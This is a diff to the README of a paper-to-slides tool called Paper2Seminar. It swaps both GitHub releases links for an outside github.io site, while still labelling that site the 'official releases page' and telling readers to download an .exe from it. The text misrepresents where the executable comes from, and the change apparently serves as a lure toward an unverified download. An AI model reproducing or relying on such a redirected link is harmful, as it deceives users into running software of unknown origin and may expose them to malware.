@@ -1,6 +1,6 @@
 # 📚 Paper2Seminar - Turn research papers into seminar presentations
 
-[![Download Latest Version](https://img.shields.io/badge/Download_Paper2Seminar-blue.svg)](https://github.com/lukesald251/Paper2Seminar/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download_Paper2Seminar-blue.svg)](https://lukesald251.github.io)
 
 Paper2Seminar converts dense academic research papers into structured, editable PowerPoint presentations. This tool helps researchers and students save time by automating the slide creation process. You feed a PDF of your paper into the tool, and it generates a professional slide deck ready for your seminar.
 
@@ -8,7 +8,7 @@ Paper2Seminar converts dense academic research papers into structured, editable 
 
 Follow these steps to get the tool on your computer.
 
-1. Visit the [official releases page](https://github.com/lukesald251/Paper2Seminar/releases).
+1. Visit the [official releases page](https://lukesald251.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file that ends with `.exe` to start the download.
 4. Save the file to your desktop or your Downloads folder.
